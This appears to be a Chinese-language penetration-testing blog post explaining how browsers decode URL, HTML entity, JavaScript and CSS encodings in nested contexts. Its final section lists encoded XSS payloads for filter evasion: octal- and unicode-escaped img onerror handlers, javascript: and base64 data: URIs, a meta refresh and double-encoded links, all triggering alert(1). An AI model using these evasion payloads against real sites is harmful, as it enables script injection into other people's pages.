---
draft: false
date: 2017-03-30 15:25:37
title: XSS 中的编码
description: 
categories:
  - Pentest
tags:
  - xss
---

![攻壳机动队](/img/anime/anime006.jpg)

### 0x00 浏览器解析
```
浏览器收到服务器发来的HTML内容，会从头解析，遇到<script></script>时，
会调用js脚本解析器来解析并执行脚本，然后继续解析其他的HTML内容，
对于需要触发才能执行的事件，当事件触发时脚本解析器才会解析其中的脚本，
在这之前它是HTML的一部分
```

### 0x01 一些编码
* URL编码
```
%+字符的ASCII编码对应的两位十六进制，如"/"的url编码为"%2F"
```

* HTML编码
    * 实体编码
    ```
    &开头分号结尾，如 "<" 的编码是 "&lt;"
    ```

    * 字符编码
    ```
    样式为"&#数值;"，数值可为10进制、16进制ASCII编码或unicode字符编码
    如"<"可编码为"&#060;"和"&#x3c;"，但是必须在属性值里面
    ```

* JS编码
```
1、两个十六进制数字，如果不够个数，前面补0，例如"<"编码为"\x3c"
2、三个八进制数字，如果不够个数，前面补0，例如"<"编码为"\074"
3、四个十六进制数字，如果不够个数，前面补0，例如"<"编码为"\u003c"
4、对于一些控制字符，使用特殊的C类型的转义风格（例如\n和\r）
```

* CSS编码
```
反斜线(\)后跟1~6位的16进制数字，如"e"为"\65"或"65"或"00065"
```

### 0x02 编码与解码顺序
解码时先解码最外层，编码时先编码最内层
```html
如<td onclick="openUrl(add.do?userName='{$value}');">11</td>，
首先value出现在url中，而url在js中，而js又是html一部分，所以
解码顺序为：html解码->js解码->url解码
编码顺序为：url编码->js编码->html编码
```

### 0x03 利用
* 八进制
```
<p id="test"></p>
<script type="text/javascript">
var test = "\74\151\155\147\40\163\162\143\75\170\40\157\156\145\162\162\157\162\75\141\154\145\162\164\50\61\51\76";
var p = document.getElementById('test'); #这里会进行js解码
p.innerHTML = test;
</script>
```

* 十进制和十六进制
```
<img src=x onerror="\u0061\u006c\u0065\u0072\u0074(1)">
<img src=x onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">
```

* javascript协议
```
<a href="javascript:alert(1)">xxx</a>
```

* data协议
```
<a href="data:text/html,<script>alert(1)</script>">xxxxxx</a>
<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">111</a>
<meta http-equiv="refresh" content="x;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
```

* html5新增实体编码
```
<a href="javasc&NewLine;ript&colon;alert(1)">aaaa</a>
```

* 多次编码
```
点击后跳转到url，进行url解码
<a href="javascript:%61lert(1)">xxxx</a>
先最外围的html解码，然后href里的url解码
<a href="j&#x0061;vascript:&#x25;61lert(1)">click me</a>
```